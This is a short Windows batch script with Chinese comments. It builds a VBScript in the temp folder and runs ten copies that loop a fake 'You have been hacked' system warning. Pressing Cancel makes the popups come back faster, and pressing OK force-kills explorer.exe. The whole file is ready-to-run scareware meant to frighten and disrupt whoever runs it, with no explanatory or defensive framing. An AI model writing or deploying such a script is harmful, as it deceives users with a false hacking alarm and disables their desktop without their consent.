@echo off
setlocal enabledelayedexpansion

set "vbfile=%temp%\popup.vbs"

:: 创建 VBS 内容
break > "%vbfile%"
>> "%vbfile%" echo Dim i
>> "%vbfile%" echo i = 1000
>> "%vbfile%" echo Do
>> "%vbfile%" echo   response = MsgBox("You have been hacked. Exit now?", vbOKCancel + vbExclamation, "System Warning")
>> "%vbfile%" echo   If response = vbCancel Then
>> "%vbfile%" echo     i = i - 100
>> "%vbfile%" echo     If i ^< 100 Then i = 100
>> "%vbfile%" echo   ElseIf response = vbOK Then
>> "%vbfile%" echo     Set objShell = CreateObject("Wscript.Shell")
>> "%vbfile%" echo     objShell.Run "taskkill /f /im explorer.exe", 0, False
>> "%vbfile%" echo     WScript.Quit
>> "%vbfile%" echo   End If
>> "%vbfile%" echo   WScript.Sleep i
>> "%vbfile%" echo Loop

:: 一次性弹出多个实例
for /L %%i in (1,1,10) do (
  start "" wscript.exe "%vbfile%"
  timeout /nobreak /t 1 >nul
)
